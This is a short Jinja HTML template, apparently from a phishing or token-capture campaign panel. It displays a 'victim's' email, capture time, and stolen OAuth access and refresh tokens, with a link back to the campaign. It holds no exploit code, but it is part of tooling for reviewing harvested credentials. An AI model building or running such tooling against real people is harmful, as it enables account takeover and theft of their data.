{% extends "base.html" %}
{% block title %}Victim Tokens{% endblock %}
{% block content %}
<div class="card">
    <h2>🔑 Tokens for {{ victim.email }}</h2>
    <p><strong>Captured at:</strong> {{ victim.captured_at }}</p>
    <h3>Access Token</h3>
    <div style="background: #f5f5f7; padding: 16px; border-radius: 8px; word-wrap: break-word; font-family: monospace; font-size: 12px;">{{ victim.access_token }}</div>
    <h3>Refresh Token</h3>
    <div style="background: #f5f5f7; padding: 16px; border-radius: 8px; word-wrap: break-word; font-family: monospace; font-size: 12px;">{{ victim.refresh_token }}</div>
    <br>
    <a href="/campaign/{{ victim.campaign_id }}/detail" class="btn btn-outline">← Back to Campaign</a>
</div>
{% endblock %}
